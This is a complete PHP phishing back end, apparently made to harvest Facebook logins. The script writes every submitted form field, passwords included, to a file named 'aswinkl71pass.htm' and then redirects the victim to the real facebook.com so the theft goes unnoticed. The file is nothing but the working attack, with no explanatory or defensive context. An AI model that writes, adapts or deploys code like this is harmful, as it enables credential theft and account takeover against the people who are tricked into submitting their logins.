<?php
header ('Location:https://www.facebook.com/');
$handle = fopen("aswinkl71pass.htm", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "<br>");
}
fwrite($handle, "<hr>");
fclose($handle);
exit;
?>